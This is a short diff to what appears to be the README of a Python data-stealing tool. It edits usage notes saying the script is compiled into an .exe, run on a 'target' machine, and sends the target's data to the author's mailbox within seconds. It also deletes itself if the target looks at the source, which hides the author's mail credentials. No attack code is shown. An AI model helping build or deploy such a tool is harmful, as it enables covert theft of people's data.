@@ -9,7 +9,7 @@
 >
 > ![image](https://user-images.githubusercontent.com/80414186/124387557-1d106a00-dcad-11eb-9d37-d643f5e13e20.png)
 >
-> you have to build the python file into an .exe to be executable into the desired machine
+> you have to build the python into .exe to be executable 
 > use  python setup.py build
   
->  after running the compiled .exe filed in about 5/10 seconds the data will arrive into inbox, if the target see the source code of the file it inmmediately deletes itself to not expose our mail credentials
+>  after running the compiled .exe filed in about 5/10 seconds the data will be sent, if the target see the source code of the file it inmmediately deletes itself to not expose our mail credentials
